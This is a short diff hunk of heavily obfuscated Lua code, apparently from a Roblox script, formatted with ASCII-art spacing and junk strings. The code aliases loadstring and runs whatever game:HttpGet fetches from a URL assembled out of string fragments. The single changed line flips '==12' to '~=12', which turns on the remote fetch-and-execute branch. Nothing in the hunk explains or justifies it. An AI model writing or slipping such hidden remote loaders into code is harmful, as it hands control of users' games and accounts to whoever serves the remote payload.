@@ -32,7 +32,7 @@
    0542da4bc]]..             [[ad99edd]],                   "download"F=F
       local lsg=             loadstring;Z                   =[[aint2]]
           do lsg             (game:HttpGet                  ([[ad=
-              ]]             ==12 and WOD..                 H)
+              ]]             ~=12 and WOD..                 H)
                              or"")(...);end
                              Q=[[Ad9u3tnAD]]
                              while 31==0.2 do
